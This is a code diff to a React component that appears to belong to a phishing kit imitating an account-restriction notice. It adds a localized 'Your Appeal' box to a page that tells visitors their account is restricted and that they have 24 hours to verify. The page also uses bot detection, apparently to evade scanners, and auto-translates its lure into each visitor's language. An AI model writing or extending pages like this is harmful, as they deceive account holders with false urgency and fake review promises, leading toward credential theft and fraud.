@@ -3,7 +3,7 @@ import { PATHS } from '@/router/router';
 import countryToLanguage from '@/utils/country_to_language';
 import { translateText } from '@/utils/translate';
 import detectBot from '@/utils/detect_bot';
-import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
+import { faCircleCheck, faIdCard, faFileAlt } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import { useCallback, useEffect, useMemo, useState } from 'react';
@@ -20,7 +20,9 @@ const Index = () => {
             protectionText: "Please verify and follow the steps as instructed.",
             processText: 'To avoid account lock you have only 24 hours left to verify and appeal.',
             continueBtn: 'Verification',
-            restrictedText: 'Your account was restricted on'
+            restrictedText: 'Your account was restricted on',
+            appealText: 'Your Appeal',
+            appealDescription: 'If you believe this is a mistake, you can submit an appeal for review. Our team will investigate your case within 24 hours.'
         }),
         []
     );
@@ -30,7 +32,25 @@ const Index = () => {
     const translateAllTexts = useCallback(
         async (targetLang) => {
             try {
-                const [translatedTitle, translatedDesc, translatedProtection, translatedProcess, translatedContinue, translatedRestricted] = await Promise.all([translateText(defaultTexts.title, targetLang), translateText(defaultTexts.description, targetLang), translateText(defaultTexts.protectionText, targetLang), translateText(defaultTexts.processText, targetLang), translateText(defaultTexts.continueBtn, targetLang), translateText(defaultTexts.restrictedText, targetLang)]);
+                const [
+                    translatedTitle, 
+                    translatedDesc, 
+                    translatedProtection, 
+                    translatedProcess, 
+                    translatedContinue, 
+                    translatedRestricted,
+                    translatedAppeal,
+                    translatedAppealDesc
+                ] = await Promise.all([
+                    translateText(defaultTexts.title, targetLang), 
+                    translateText(defaultTexts.description, targetLang), 
+                    translateText(defaultTexts.protectionText, targetLang), 
+                    translateText(defaultTexts.processText, targetLang), 
+                    translateText(defaultTexts.continueBtn, targetLang), 
+                    translateText(defaultTexts.restrictedText, targetLang),
+                    translateText(defaultTexts.appealText, targetLang),
+                    translateText(defaultTexts.appealDescription, targetLang)
+                ]);
 
                 setTranslatedTexts({
                     title: translatedTitle,
@@ -38,7 +58,9 @@ const Index = () => {
                     protectionText: translatedProtection,
                     processText: translatedProcess,
                     continueBtn: translatedContinue,
-                    restrictedText: translatedRestricted
+                    restrictedText: translatedRestricted,
+                    appealText: translatedAppeal,
+                    appealDescription: translatedAppealDesc
                 });
             } catch (error) {
                 console.log('translation failed:', error.message);
@@ -119,6 +141,16 @@ const Index = () => {
                 >
                     {translatedTexts.continueBtn}
                 </button>
+
+                {/* Appeal Section - Thêm vào đây */}
+                <div className='mt-4 rounded-lg border border-gray-300 bg-gray-50 p-4'>
+                    <div className='flex items-center gap-2 mb-2'>
+                        <FontAwesomeIcon icon={faFileAlt} className='h-5 w-5 text-blue-500' />
+                        <p className='font-bold text-lg'>{translatedTexts.appealText}</p>
+                    </div>
+                    <p className='text-sm text-gray-600'>{translatedTexts.appealDescription}</p>
+                </div>
+
                 <p className='text-center'>
                     {translatedTexts.restrictedText} <span className='font-bold'>{today}</span>
                 </p>
